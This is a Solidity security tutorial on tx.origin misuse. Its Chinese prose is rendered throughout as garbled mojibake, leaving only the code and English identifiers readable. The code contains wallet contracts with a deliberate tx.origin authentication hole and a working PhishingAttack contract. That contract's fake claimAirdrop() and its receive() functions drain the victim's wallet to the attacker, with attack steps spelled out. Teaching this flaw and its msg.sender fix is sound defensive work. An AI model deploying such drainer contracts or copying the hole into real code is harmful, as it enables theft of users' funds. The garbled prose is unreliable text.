# tx.origin è¯¯ç”¨ (tx.origin Misuse)

## 1. ã€30å­—æ ¸å¿ƒã€‘

**tx.origin æ˜¯äº¤æ˜“æœ€åˆå‘èµ·è€…åœ°å€ï¼Œmsg.sender æ˜¯ç›´æ¥è°ƒç”¨è€…åœ°å€ï¼Œä½¿ç”¨ tx.origin åšèº«ä»½éªŒè¯ä¼šå¯¼è‡´é’“é±¼æ”»å‡»ã€‚**

---

## 2. ã€ç¬¬ä¸€æ€§åŸç†ã€‘

### ä»€ä¹ˆæ˜¯ç¬¬ä¸€æ€§åŸç†ï¼Ÿ

**ç¬¬ä¸€æ€§åŸç†**ï¼šå›åˆ°äº‹ç‰©æœ€åŸºæœ¬çš„çœŸç†ï¼Œä»æºå¤´æ€è€ƒé—®é¢˜

### tx.origin è¯¯ç”¨çš„ç¬¬ä¸€æ€§åŸç† ğŸ¯

#### 1. æœ€åŸºç¡€çš„å®šä¹‰

**tx.origin = æ•´æ¡è°ƒç”¨é“¾çš„æœ€åˆå‘èµ·è€…ï¼ˆä¸€å®šæ˜¯ EOAï¼‰**
**msg.sender = å½“å‰è°ƒç”¨çš„ç›´æ¥å‘èµ·è€…ï¼ˆå¯ä»¥æ˜¯ EOA æˆ–åˆçº¦ï¼‰**

```
ç”¨æˆ·(EOA) â†’ åˆçº¦A â†’ åˆçº¦B â†’ åˆçº¦C
           â”‚        â”‚        â”‚
           â”‚        â”‚        â””â”€ msg.sender = åˆçº¦B
           â”‚        â”‚           tx.origin = ç”¨æˆ·(EOA)
           â”‚        â”‚
           â”‚        â””â”€ msg.sender = åˆçº¦A
           â”‚           tx.origin = ç”¨æˆ·(EOA)
           â”‚
           â””â”€ msg.sender = ç”¨æˆ·(EOA)
              tx.origin = ç”¨æˆ·(EOA)
```

#### 2. ä¸ºä»€ä¹ˆ tx.origin åšæƒé™éªŒè¯æœ‰é—®é¢˜ï¼Ÿ

**æ ¸å¿ƒé—®é¢˜ï¼šæ”»å‡»è€…å¯ä»¥è¯±éª—ç”¨æˆ·è°ƒç”¨æ¶æ„åˆçº¦ï¼Œæ¶æ„åˆçº¦å†è°ƒç”¨ç›®æ ‡åˆçº¦ï¼Œæ­¤æ—¶ tx.origin ä»æ˜¯ç”¨æˆ·åœ°å€ã€‚**

```
æ”»å‡»æµç¨‹ï¼š
1. ç”¨æˆ·è¢«è¯±å¯¼è°ƒç”¨æ”»å‡»è€…çš„æ¶æ„åˆçº¦
2. æ¶æ„åˆçº¦è°ƒç”¨ç›®æ ‡åˆçº¦çš„æ•æ„Ÿå‡½æ•°
3. ç›®æ ‡åˆçº¦æ£€æŸ¥ tx.origin == ownerï¼Œé€šè¿‡ï¼ï¼ˆå› ä¸ºtx.originæ˜¯ç”¨æˆ·ï¼‰
4. æ”»å‡»æˆåŠŸï¼Œç”¨æˆ·èµ„é‡‘è¢«ç›—
```

#### 3. ä½¿ç”¨ tx.origin çš„ä¸‰ä¸ªåœºæ™¯åˆ†æ

##### åœºæ™¯1ï¼šèº«ä»½éªŒè¯ï¼ˆâŒ é”™è¯¯ç”¨æ³•ï¼‰

```solidity
// âŒ å±é™©ï¼šä½¿ç”¨ tx.origin éªŒè¯èº«ä»½
function withdraw() external {
    require(tx.origin == owner, "Not owner");  // å¯è¢«é’“é±¼æ”»å‡»
    payable(msg.sender).transfer(address(this).balance);
}
```

##### åœºæ™¯2ï¼šé˜²æ­¢åˆçº¦è°ƒç”¨ï¼ˆâš ï¸ æœ‰äº‰è®®ï¼‰

```solidity
// âš ï¸ æœ‰äº‰è®®ï¼šé˜²æ­¢åˆçº¦è°ƒç”¨
modifier noContract() {
    require(tx.origin == msg.sender, "No contracts");
    _;
}
// é—®é¢˜ï¼šé˜»æ­¢äº†è´¦æˆ·æŠ½è±¡(AA)é’±åŒ…ç­‰åˆæ³•åœºæ™¯
```

##### åœºæ™¯3ï¼šGas è¡¥è´´æ¥æºè¿½è¸ªï¼ˆâœ… åˆç†ç”¨æ³•ï¼‰

```solidity
// âœ… åˆç†ï¼šè®°å½•è°å‘èµ·äº†äº¤æ˜“ï¼ˆä¸ç”¨äºæƒé™éªŒè¯ï¼‰
event TransactionInitiated(address indexed origin);

function doSomething() external {
    emit TransactionInitiated(tx.origin);  // ä»…ç”¨äºæ—¥å¿—
}
```

#### 4. ä»ç¬¬ä¸€æ€§åŸç†æ¨å¯¼å®‰å…¨å®è·µ

**æ¨ç†é“¾ï¼š**

```
1. å‰æï¼štx.origin æ°¸è¿œæ˜¯ EOAï¼Œæ— æ³•ä¼ªé€ 
   â†“
2. ä½†æ˜¯ï¼šæ”»å‡»è€…å¯ä»¥è¯±éª— EOA å‘èµ·äº¤æ˜“
   â†“
3. æ¨å¯¼ï¼šæ¶æ„åˆçº¦å¯ä»¥å€Ÿç”¨ EOA çš„ tx.origin
   â†“
4. ç»“è®ºï¼štx.origin ä¸èƒ½ç”¨äºæƒé™éªŒè¯
   â†“
5. æ­£ç¡®åšæ³•ï¼šä½¿ç”¨ msg.sender éªŒè¯ç›´æ¥è°ƒç”¨è€…
   â†“
6. è¾¹ç•Œæƒ…å†µï¼šé˜²æ­¢åˆçº¦è°ƒç”¨åº”ä½¿ç”¨å…¶ä»–æœºåˆ¶
```

#### 5. ä¸€å¥è¯æ€»ç»“ç¬¬ä¸€æ€§åŸç†

**tx.origin è¡¨ç¤º"è°å‘èµ·äº†äº¤æ˜“"ï¼Œmsg.sender è¡¨ç¤º"è°åœ¨è°ƒç”¨æˆ‘"ï¼Œæƒé™éªŒè¯åº”è¯¥éªŒè¯"è°åœ¨è°ƒç”¨æˆ‘"è€Œé"è°å‘èµ·äº†äº¤æ˜“"ã€‚**

---

## 3. ã€3ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‘

### æ ¸å¿ƒæ¦‚å¿µ1ï¼šè°ƒç”¨é“¾ä¸èº«ä»½ ğŸ”—

**ä¸€å¥è¯å®šä¹‰ï¼š** ä»¥å¤ªåŠäº¤æ˜“å¯ä»¥å½¢æˆå¤šå±‚è°ƒç”¨é“¾ï¼Œtx.origin å§‹ç»ˆæŒ‡å‘é“¾é¦–çš„ EOAï¼Œmsg.sender æŒ‡å‘ç›´æ¥ä¸Šæ¸¸ã€‚

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ===== æ¼”ç¤ºè°ƒç”¨é“¾ä¸­çš„ tx.origin å’Œ msg.sender =====

contract ContractA {
    event CallInfo(address txOrigin, address msgSender, string location);
    
    function callB(address contractB) external {
        emit CallInfo(tx.origin, msg.sender, "ContractA");
        ContractB(contractB).callC();
    }
}

contract ContractB {
    event CallInfo(address txOrigin, address msgSender, string location);
    address public contractC;
    
    constructor(address _contractC) {
        contractC = _contractC;
    }
    
    function callC() external {
        emit CallInfo(tx.origin, msg.sender, "ContractB");
        ContractC(contractC).doSomething();
    }
}

contract ContractC {
    event CallInfo(address txOrigin, address msgSender, string location);
    
    function doSomething() external {
        emit CallInfo(tx.origin, msg.sender, "ContractC");
    }
}

// è°ƒç”¨æµç¨‹ï¼šUser(EOA) â†’ ContractA â†’ ContractB â†’ ContractC
// 
// åœ¨ ContractA ä¸­ï¼š
//   tx.origin = User(EOA)
//   msg.sender = User(EOA)
// 
// åœ¨ ContractB ä¸­ï¼š
//   tx.origin = User(EOA)
//   msg.sender = ContractA
// 
// åœ¨ ContractC ä¸­ï¼š
//   tx.origin = User(EOA)
//   msg.sender = ContractB
```

**è¯¦ç»†è§£é‡Šï¼š**

| ä½ç½® | tx.origin | msg.sender |
|------|-----------|------------|
| ContractA | User(EOA) | User(EOA) |
| ContractB | User(EOA) | ContractA |
| ContractC | User(EOA) | ContractB |

**å…³é”®ç‚¹**ï¼š
- tx.origin åœ¨æ•´ä¸ªè°ƒç”¨é“¾ä¸­**ä¿æŒä¸å˜**
- msg.sender åœ¨æ¯æ¬¡è°ƒç”¨æ—¶**æ›´æ–°ä¸ºä¸Šä¸€å±‚è°ƒç”¨è€…**

---

### æ ¸å¿ƒæ¦‚å¿µ2ï¼šé’“é±¼æ”»å‡»åŸç† ğŸ£

**ä¸€å¥è¯å®šä¹‰ï¼š** æ”»å‡»è€…è¯±éª—ç”¨æˆ·è°ƒç”¨æ¶æ„åˆçº¦ï¼Œæ¶æ„åˆçº¦å€Ÿç”¨ç”¨æˆ·çš„ tx.origin ç»•è¿‡ç›®æ ‡åˆçº¦çš„æƒé™æ£€æŸ¥ã€‚

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ===== æœ‰æ¼æ´çš„é’±åŒ…åˆçº¦ =====
contract VulnerableWallet {
    address public owner;
    
    constructor() payable {
        owner = msg.sender;
    }
    
    // âŒ ä½¿ç”¨ tx.origin éªŒè¯èº«ä»½
    function withdraw(address to, uint256 amount) external {
        require(tx.origin == owner, "Not owner");
        payable(to).transfer(amount);
    }
    
    receive() external payable {}
}

// ===== æ”»å‡»åˆçº¦ =====
contract PhishingAttack {
    VulnerableWallet public wallet;
    address public attacker;
    
    constructor(address _wallet) {
        wallet = VulnerableWallet(payable(_wallet));
        attacker = msg.sender;
    }
    
    // ä¼ªè£…æˆæœ‰å¸å¼•åŠ›çš„å‡½æ•°ï¼Œè¯±éª—ç”¨æˆ·è°ƒç”¨
    function claimAirdrop() external {
        // ç”¨æˆ·ä»¥ä¸ºåœ¨é¢†ç©ºæŠ•
        // å®é™…ä¸Šæ˜¯åœ¨å¸®æ”»å‡»è€…ææ¬¾
        wallet.withdraw(attacker, address(wallet).balance);
    }
    
    // æˆ–è€…éšè—åœ¨ receive ä¸­
    receive() external payable {
        if (address(wallet).balance > 0) {
            wallet.withdraw(attacker, address(wallet).balance);
        }
    }
}

// æ”»å‡»æ­¥éª¤ï¼š
// 1. å—å®³è€…(owner)åˆ›å»º VulnerableWallet å¹¶å­˜å…¥ ETH
// 2. æ”»å‡»è€…éƒ¨ç½² PhishingAttackï¼Œä¼ å…¥ wallet åœ°å€
// 3. æ”»å‡»è€…è¯±éª—å—å®³è€…è°ƒç”¨ claimAirdrop()
//    - å¯èƒ½é€šè¿‡é’“é±¼ç½‘ç«™ã€å‡ç©ºæŠ•ç­‰æ–¹å¼
// 4. claimAirdrop è°ƒç”¨ wallet.withdraw()
//    æ­¤æ—¶ tx.origin = å—å®³è€…(owner)
//    æƒé™æ£€æŸ¥é€šè¿‡ï¼
// 5. æ”»å‡»è€…è·å¾—æ‰€æœ‰èµ„é‡‘
```

**è¯¦ç»†è§£é‡Šï¼š**

```
æ”»å‡»æµç¨‹å›¾ï¼š

å—å®³è€…(owner) â”€â”€è°ƒç”¨â”€â”€â†’ PhishingAttack.claimAirdrop()
                                â”‚
                                â”‚ å†…éƒ¨è°ƒç”¨
                                â†“
                        VulnerableWallet.withdraw()
                                â”‚
                        æ£€æŸ¥ tx.origin == owner
                        tx.origin = å—å®³è€… âœ“
                                â”‚
                                â†“
                        è½¬è´¦ç»™æ”»å‡»è€…åœ°å€
```

---

### æ ¸å¿ƒæ¦‚å¿µ3ï¼šæ­£ç¡®çš„æƒé™éªŒè¯ âœ…

**ä¸€å¥è¯å®šä¹‰ï¼š** ä½¿ç”¨ msg.sender éªŒè¯ç›´æ¥è°ƒç”¨è€…èº«ä»½ï¼Œè¿™æ ·ä¸­é—´çš„æ¶æ„åˆçº¦æ— æ³•å†’å……ç”¨æˆ·ã€‚

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ===== å®‰å…¨çš„é’±åŒ…åˆçº¦ =====
contract SecureWallet {
    address public owner;
    
    constructor() payable {
        owner = msg.sender;
    }
    
    // âœ… ä½¿ç”¨ msg.sender éªŒè¯èº«ä»½
    function withdraw(address to, uint256 amount) external {
        require(msg.sender == owner, "Not owner");  // æ£€æŸ¥ç›´æ¥è°ƒç”¨è€…
        payable(to).transfer(amount);
    }
    
    receive() external payable {}
}

// æ”»å‡»å°è¯•ï¼š
// å—å®³è€… â†’ PhishingAttack â†’ SecureWallet.withdraw()
//                              â”‚
//                   msg.sender = PhishingAttack â‰  owner
//                              â”‚
//                         äº¤æ˜“ revert âœ“

// ===== æ›´å®‰å…¨çš„å®ç°ï¼šä½¿ç”¨ OpenZeppelin =====
import "@openzeppelin/contracts/access/Ownable.sol";

contract BetterWallet is Ownable {
    constructor() Ownable(msg.sender) payable {}
    
    function withdraw(address to, uint256 amount) external onlyOwner {
        payable(to).transfer(amount);
    }
    
    receive() external payable {}
}
```

**å¯¹æ¯”è¡¨ï¼š**

| åœºæ™¯ | tx.origin éªŒè¯ | msg.sender éªŒè¯ |
|------|---------------|-----------------|
| ç”¨æˆ·ç›´æ¥è°ƒç”¨ | âœ… é€šè¿‡ | âœ… é€šè¿‡ |
| é€šè¿‡æ¶æ„åˆçº¦è°ƒç”¨ | âŒ ä¹Ÿé€šè¿‡ï¼ˆå±é™©ï¼‰ | âœ… æ‹’ç» |
| é€šè¿‡æˆæƒåˆçº¦è°ƒç”¨ | âœ… é€šè¿‡ | âŒ æ‹’ç»ï¼ˆéœ€é¢å¤–æˆæƒï¼‰ |

---

## 4. ã€æœ€å°å¯ç”¨ã€‘

æŒæ¡ä»¥ä¸‹å†…å®¹ï¼Œå°±èƒ½é˜²æ­¢ tx.origin ç›¸å…³æ¼æ´ï¼š

### 4.1 æ°¸è¿œä½¿ç”¨ msg.sender åšæƒé™éªŒè¯

```solidity
// âŒ å±é™©
require(tx.origin == owner, "Not owner");

// âœ… å®‰å…¨
require(msg.sender == owner, "Not owner");

// âœ… æ›´å¥½ï¼šä½¿ç”¨ OpenZeppelin
import "@openzeppelin/contracts/access/Ownable.sol";
// onlyOwner å†…éƒ¨ä½¿ç”¨ msg.sender
```

### 4.2 ç†è§£ä¸¤è€…çš„åŒºåˆ«

```solidity
// tx.origin: äº¤æ˜“å‘èµ·è€…ï¼ˆæ°¸è¿œæ˜¯ EOAï¼‰
// msg.sender: ç›´æ¥è°ƒç”¨è€…ï¼ˆå¯ä»¥æ˜¯ EOA æˆ–åˆçº¦ï¼‰

// åˆ¤æ–­è°ƒç”¨è€…æ˜¯ EOA è¿˜æ˜¯åˆçº¦
function isContract(address account) internal view returns (bool) {
    return account.code.length > 0;
}

// ä½†æ›´å®‰å…¨çš„åšæ³•æ˜¯ä¸åŒºåˆ†ï¼Œç»Ÿä¸€ç”¨ msg.sender
```

### 4.3 è¯†åˆ«å±é™©ä»£ç 

```solidity
// å±é™©ä¿¡å·ï¼šåœ¨æƒé™æ£€æŸ¥ä¸­çœ‹åˆ° tx.origin
if (tx.origin == admin) { ... }       // âŒ
require(tx.origin == owner);          // âŒ
modifier onlyOwner() {
    require(tx.origin == owner);      // âŒ
    _;
}
```

### 4.4 tx.origin çš„åˆç†ç”¨é€”

```solidity
// âœ… è®°å½•æ—¥å¿—ï¼ˆä¸ç”¨äºæƒé™ï¼‰
emit TransactionInitiated(tx.origin);

// âœ… Gas è¡¥è´´è¿½è¸ªï¼ˆä¸ç”¨äºæƒé™ï¼‰
gasSponsors[tx.origin] += gasUsed;

// âš ï¸ é˜²æ­¢åˆçº¦è°ƒç”¨ï¼ˆæœ‰äº‰è®®ï¼Œä¼šé˜»æ­¢ AA é’±åŒ…ï¼‰
require(tx.origin == msg.sender, "No contracts");
```

**è¿™äº›çŸ¥è¯†è¶³ä»¥ï¼š**
- âœ… é¿å…åœ¨æƒé™éªŒè¯ä¸­ä½¿ç”¨ tx.origin
- âœ… è¯†åˆ«ä»£ç å®¡è®¡ä¸­çš„ tx.origin æ¼æ´
- âœ… ç†è§£é’“é±¼æ”»å‡»çš„åŸç†
- âœ… æ­£ç¡®é€‰æ‹© msg.sender è¿˜æ˜¯ tx.origin

---

## 5. ã€1ä¸ªç±»æ¯”ã€‘

### ç±»æ¯”1ï¼štx.origin vs msg.sender ğŸ­

#### ç”Ÿæ´»åœºæ™¯ç±»æ¯”ï¼šç”µè¯è¯ˆéª—

æƒ³è±¡ä¸€ä¸ªé“¶è¡Œçš„ç”µè¯å®¢æœç³»ç»Ÿï¼š

**é”™è¯¯çš„éªŒè¯æ–¹å¼ï¼ˆç±»ä¼¼ tx.originï¼‰ï¼š**
```
è¯ˆéª—çŠ¯ â”€â”€ç”µè¯â”€â”€â†’ å—å®³è€… â”€â”€ç”µè¯â”€â”€â†’ é“¶è¡Œå®¢æœ
                   â”‚
        è¯ˆéª—çŠ¯å‡å†’é“¶è¡Œï¼š        é“¶è¡Œæ£€æŸ¥æ¥ç”µæ˜¾ç¤º
        "è¯·å¸®æˆ‘è½¬æ¥é“¶è¡Œ"        æ¥ç”µæ˜¾ç¤º = å—å®³è€…å·ç 
                               "å¥½çš„ï¼Œå·²éªŒè¯æ˜¯å®¢æˆ·æœ¬äºº"
                                        â†“
                               æ‰§è¡Œè½¬è´¦æ“ä½œ âŒ
```

é“¶è¡Œåªçœ‹"æ¥ç”µæ˜¾ç¤º"ï¼ˆtx.originï¼‰= å—å®³è€…ï¼Œå°±ä¿¡ä»»äº†ã€‚

**æ­£ç¡®çš„éªŒè¯æ–¹å¼ï¼ˆç±»ä¼¼ msg.senderï¼‰ï¼š**
```
è¯ˆéª—çŠ¯ â”€â”€ç”µè¯â”€â”€â†’ å—å®³è€… â”€â”€ç”µè¯â”€â”€â†’ é“¶è¡Œå®¢æœ
                                    â”‚
                            é“¶è¡Œè¦æ±‚ï¼š
                            "è¯·è¯´å‡ºæ‚¨çš„å¯†ç /éªŒè¯ç "
                                    â”‚
                            å—å®³è€…ä¸çŸ¥é“å¯†ç 
                                    â†“
                               æ‹’ç»æ“ä½œ âœ…
```

é“¶è¡ŒéªŒè¯"æ˜¯è°åœ¨è·Ÿæˆ‘å¯¹è¯"ï¼ˆmsg.senderï¼‰= å—å®³è€…ï¼Œéœ€è¦å—å®³è€…æœ¬äººæä¾›å‡­è¯ã€‚

**å¯¹åº”å…³ç³»ï¼š**
- **æ¥ç”µæ˜¾ç¤ºï¼ˆtx.originï¼‰**ï¼šæ˜¾ç¤ºæœ€åˆæ‹¨æ‰“è€…ï¼Œä½†å¯ä»¥è¢«ä¸­é—´äººåˆ©ç”¨
- **å¯†ç éªŒè¯ï¼ˆmsg.sender + ç­¾åï¼‰**ï¼šéªŒè¯ç›´æ¥å¯¹è¯è€…çš„èº«ä»½å‡­è¯

---

#### å‰ç«¯é¢†åŸŸç±»æ¯”ï¼šCookie/Token éªŒè¯ vs è¯·æ±‚æ¥æºéªŒè¯

å¦‚æœä½ åšè¿‡å‰ç«¯å¼€å‘ï¼Œè¿™ç±»ä¼¼äºï¼š

```javascript
// âŒ é”™è¯¯ï¼šåªéªŒè¯ Refererï¼ˆç±»ä¼¼ tx.originï¼‰
app.post('/api/transfer', (req, res) => {
    // åªæ£€æŸ¥è¯·æ±‚æ¥æº
    if (req.headers.referer.includes('ourbank.com')) {
        // æ¶æ„ç½‘ç«™å¯ä»¥è¯±å¯¼ç”¨æˆ·åœ¨å…¶é¡µé¢å‘èµ·è¯·æ±‚
        // Referer å¯èƒ½ä»æ˜¾ç¤ºç”¨æˆ·çš„æµè§ˆå™¨æ¥æº
        processTransfer(req.body);
    }
});

// âœ… æ­£ç¡®ï¼šéªŒè¯ Token/Sessionï¼ˆç±»ä¼¼ msg.senderï¼‰
app.post('/api/transfer', (req, res) => {
    // éªŒè¯ Authorization Token
    const user = verifyToken(req.headers.authorization);
    if (!user || user.id !== req.body.userId) {
        return res.status(403).send('Unauthorized');
    }
    processTransfer(req.body);
});
```

**CSRF æ”»å‡»ç±»æ¯”ï¼š**

```
é’“é±¼æ”»å‡»æµç¨‹                    CSRF æ”»å‡»æµç¨‹
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
æ¶æ„åˆçº¦è¯±éª—ç”¨æˆ·è°ƒç”¨            æ¶æ„ç½‘ç«™è¯±å¯¼ç”¨æˆ·ç‚¹å‡»
     â†“                              â†“
ç”¨æˆ·ä½œä¸º tx.origin               ç”¨æˆ·æµè§ˆå™¨å¸¦ä¸Š Cookie
     â†“                              â†“
æ¶æ„åˆçº¦è°ƒç”¨ç›®æ ‡åˆçº¦            æ¶æ„ç½‘ç«™å‘èµ·è¯·æ±‚åˆ°ç›®æ ‡ç«™ç‚¹
     â†“                              â†“
tx.origin éªŒè¯é€šè¿‡              Cookie éªŒè¯é€šè¿‡
     â†“                              â†“
æ”»å‡»æˆåŠŸ                        æ”»å‡»æˆåŠŸ

é˜²å¾¡æ–¹å¼ï¼š                       é˜²å¾¡æ–¹å¼ï¼š
ä½¿ç”¨ msg.sender                  ä½¿ç”¨ CSRF Token
```

**ä»£ç å¯¹æ¯”ï¼š**

```javascript
// å‰ç«¯ - é˜²æ­¢ CSRF
// ä¸èƒ½åªé  Cookie éªŒè¯ï¼ˆç±»ä¼¼ tx.originï¼‰
// éœ€è¦ CSRF Tokenï¼ˆç±»ä¼¼ msg.sender éªŒè¯ï¼‰

axios.post('/api/transfer', data, {
    headers: {
        'X-CSRF-Token': getCsrfToken()  // é¢å¤–éªŒè¯
    }
});
```

```solidity
// Solidity - é˜²æ­¢é’“é±¼
// ä¸èƒ½ç”¨ tx.originï¼ˆç±»ä¼¼åªé  Cookieï¼‰
// éœ€è¦ msg.senderï¼ˆç±»ä¼¼ CSRF Tokenï¼‰

function transfer() external {
    require(msg.sender == owner);  // ç›´æ¥éªŒè¯è°ƒç”¨è€…
}
```

---

### ç±»æ¯”æ€»ç»“è¡¨

| tx.origin æ¦‚å¿µ | ç”Ÿæ´»åœºæ™¯ç±»æ¯” | å‰ç«¯é¢†åŸŸç±»æ¯” | æ ¸å¿ƒç›¸ä¼¼æ€§ |
|---------------|-------------|-------------|-----------|
| **tx.origin** | æ¥ç”µæ˜¾ç¤º | HTTP Referer/Cookie | å®¹æ˜“è¢«åˆ©ç”¨ |
| **msg.sender** | å¯¹è¯å¯†ç éªŒè¯ | Authorization Token | ç›´æ¥éªŒè¯èº«ä»½ |
| **é’“é±¼æ”»å‡»** | ç”µè¯è¯ˆéª— | CSRF æ”»å‡» | å€Ÿç”¨å—å®³è€…èº«ä»½ |
| **æ¶æ„åˆçº¦** | è¯ˆéª—çŠ¯è½¬æ¥ç”µè¯ | æ¶æ„ç½‘ç«™ | ä¸­é—´äººè§’è‰² |
| **æ­£ç¡®éªŒè¯** | å¯†ç /æŒ‡çº¹éªŒè¯ | CSRF Token | é¢å¤–èº«ä»½å‡­è¯ |

---

## 6. ã€åç›´è§‰ç‚¹ã€‘

### è¯¯åŒº1ï¼štx.origin æ›´å®‰å…¨ï¼Œå› ä¸ºå®ƒä¸€å®šæ˜¯ EOA âŒ

**ä¸ºä»€ä¹ˆé”™ï¼Ÿ**

è™½ç„¶ tx.origin ç¡®å®æ€»æ˜¯ EOAï¼ˆå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼‰ï¼Œä¸èƒ½è¢«ä¼ªé€ ï¼Œä½†è¿™æ­£æ˜¯é—®é¢˜æ‰€åœ¨ï¼š

- æ”»å‡»è€…ä¸éœ€è¦ä¼ªé€  tx.origin
- æ”»å‡»è€…åªéœ€è¦**è¯±éª—çœŸæ­£çš„ owner** å‘èµ·äº¤æ˜“
- æ¶æ„åˆçº¦å¯ä»¥"å€Ÿç”¨"è¿™ä¸ª tx.origin

**ä¸ºä»€ä¹ˆäººä»¬å®¹æ˜“è¿™æ ·é”™ï¼Ÿ**

å¼€å‘è€…è®¤ä¸º"EOA èº«ä»½ä¸èƒ½ä¼ªé€  = å®‰å…¨"ï¼Œå¿½ç•¥äº†ä¸­é—´äººæ”»å‡»åœºæ™¯ã€‚

**æ­£ç¡®ç†è§£ï¼š**

```solidity
// âŒ é”™è¯¯é€»è¾‘ï¼štx.origin æ˜¯ EOAï¼Œæ‰€ä»¥å®‰å…¨
// æ”»å‡»è€…ä¸ä¼ªé€  tx.originï¼Œè€Œæ˜¯è¯±éª— owner å‘èµ·äº¤æ˜“

// æ”»å‡»æµç¨‹ï¼š
// 1. owner è¢«è¯±éª—è°ƒç”¨æ¶æ„åˆçº¦
// 2. æ¶æ„åˆçº¦è°ƒç”¨ç›®æ ‡åˆçº¦
// 3. tx.origin = ownerï¼ˆçœŸå®çš„ï¼ï¼‰
// 4. éªŒè¯é€šè¿‡ï¼Œæ”»å‡»æˆåŠŸ

// âœ… æ­£ç¡®ç†è§£ï¼šmsg.sender æ‰èƒ½é˜²æ­¢ä¸­é—´äºº
function safe() external {
    require(msg.sender == owner);  // æ¶æ„åˆçº¦æ— æ³•é€šè¿‡
}
```

---

### è¯¯åŒº2ï¼štx.origin == msg.sender å¯ä»¥é˜²æ­¢åˆçº¦è°ƒç”¨ âŒ

**ä¸ºä»€ä¹ˆé”™ï¼Ÿ**

è¿™ç§åšæ³•ç¡®å®å¯ä»¥é˜»æ­¢åˆçº¦è°ƒç”¨ï¼Œä½†æœ‰ä¸¥é‡å‰¯ä½œç”¨ï¼š

1. **é˜»æ­¢è´¦æˆ·æŠ½è±¡ï¼ˆAAï¼‰é’±åŒ…**ï¼šå¦‚ Safeã€Argent ç­‰æ™ºèƒ½åˆçº¦é’±åŒ…
2. **é˜»æ­¢ EIP-4337**ï¼šæœªæ¥çš„è´¦æˆ·æŠ½è±¡æ ‡å‡†
3. **é™åˆ¶ç»„åˆæ€§**ï¼šå…¶ä»–åˆçº¦æ— æ³•é›†æˆä½ çš„åè®®

**ä¸ºä»€ä¹ˆäººä»¬å®¹æ˜“è¿™æ ·é”™ï¼Ÿ**

å¼€å‘è€…æƒ³é˜²æ­¢"æœºå™¨äºº/åˆçº¦"è°ƒç”¨ï¼Œé‡‡ç”¨äº†æœ€ç®€å•çš„æ–¹å¼ã€‚

**æ­£ç¡®ç†è§£ï¼š**

```solidity
// âŒ é—®é¢˜ï¼šé˜»æ­¢äº†åˆæ³•çš„æ™ºèƒ½åˆçº¦é’±åŒ…
modifier noContract() {
    require(tx.origin == msg.sender, "No contracts");
    _;
}

// âœ… æ›´å¥½çš„æ›¿ä»£æ–¹æ¡ˆï¼š
// 1. å¦‚æœæ˜¯é˜²æœºå™¨äººï¼Œç”¨ç­¾åéªŒè¯
function mintWithSignature(bytes calldata signature) external {
    require(verifySignature(msg.sender, signature), "Invalid signature");
}

// 2. å¦‚æœæ˜¯é™åˆ¶é€Ÿç‡ï¼Œç”¨æ—¶é—´/æ•°é‡é™åˆ¶
mapping(address => uint256) public lastMintTime;
function mint() external {
    require(block.timestamp > lastMintTime[msg.sender] + 1 hours);
    lastMintTime[msg.sender] = block.timestamp;
}

// 3. å¦‚æœçœŸçš„éœ€è¦é˜»æ­¢åˆçº¦ï¼Œè¦æ˜ç¡®æ–‡æ¡£è¯´æ˜
// å¹¶æ¥å—æ— æ³•æ”¯æŒ AA é’±åŒ…çš„ä»£ä»·
```

---

### è¯¯åŒº3ï¼šæˆ‘çš„ç”¨æˆ·ä¸ä¼šè°ƒç”¨æ¶æ„åˆçº¦ âŒ

**ä¸ºä»€ä¹ˆé”™ï¼Ÿ**

é’“é±¼æ”»å‡»éå¸¸æ™®éå’Œæœ‰æ•ˆï¼š

1. **å‡ç©ºæŠ•ç½‘ç«™**ï¼šå£°ç§°éœ€è¦è°ƒç”¨åˆçº¦é¢†å–ç©ºæŠ•
2. **å‡ DApp å‰ç«¯**ï¼šåŸŸåç›¸ä¼¼çš„é’“é±¼ç½‘ç«™
3. **Discord/Telegram éª—å±€**ï¼šå‘é€æ¶æ„é“¾æ¥
4. **æ¶æ„ NFT**ï¼šæ”¶åˆ° NFT åæŸ¥çœ‹è§¦å‘æ¶æ„è°ƒç”¨

**ä¸ºä»€ä¹ˆäººä»¬å®¹æ˜“è¿™æ ·é”™ï¼Ÿ**

å¼€å‘è€…ä½ä¼°äº†ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»çš„æœ‰æ•ˆæ€§ã€‚

**æ­£ç¡®ç†è§£ï¼š**

```solidity
// çœŸå®æ¡ˆä¾‹ï¼š2022å¹´ OpenSea é’“é±¼æ”»å‡»
// æ”»å‡»è€…é€šè¿‡å‡é‚®ä»¶è¯±å¯¼ç”¨æˆ·ç­¾ç½²æ¶æ„äº¤æ˜“
// å³ä½¿æ˜¯èµ„æ·±ç”¨æˆ·ä¹Ÿå¯èƒ½ä¸Šå½“

// å®‰å…¨åŸåˆ™ï¼šæ°¸è¿œå‡è®¾ç”¨æˆ·å¯èƒ½è¢«è¯±éª—
// å› æ­¤ä¸èƒ½ä¾èµ– tx.origin åšæƒé™éªŒè¯

// âœ… é˜²å¾¡æ€§ç¼–ç¨‹
function withdraw() external {
    // å³ä½¿ owner è¢«è¯±éª—ï¼Œæ¶æ„åˆçº¦ä¹Ÿæ— æ³•é€šè¿‡
    require(msg.sender == owner, "Not owner");
}
```

---

## 7. ã€å®æˆ˜ä»£ç ã€‘

### åœºæ™¯1ï¼šæ¼æ´åˆçº¦

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ===== 1. æœ‰æ¼æ´çš„é’±åŒ… =====
contract VulnerableWallet {
    address public owner;
    
    event Withdrawal(address to, uint256 amount);
    
    constructor() payable {
        owner = msg.sender;
    }
    
    // âŒ ä½¿ç”¨ tx.origin éªŒè¯
    function withdraw(address payable to, uint256 amount) external {
        require(tx.origin == owner, "Not owner");  // æ¼æ´ï¼
        require(address(this).balance >= amount, "Insufficient balance");
        
        to.transfer(amount);
        emit Withdrawal(to, amount);
    }
    
    // âŒ å¦ä¸€ä¸ªå±é™©å‡½æ•°
    function transferOwnership(address newOwner) external {
        require(tx.origin == owner, "Not owner");  // æ¼æ´ï¼
        owner = newOwner;
    }
    
    receive() external payable {}
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

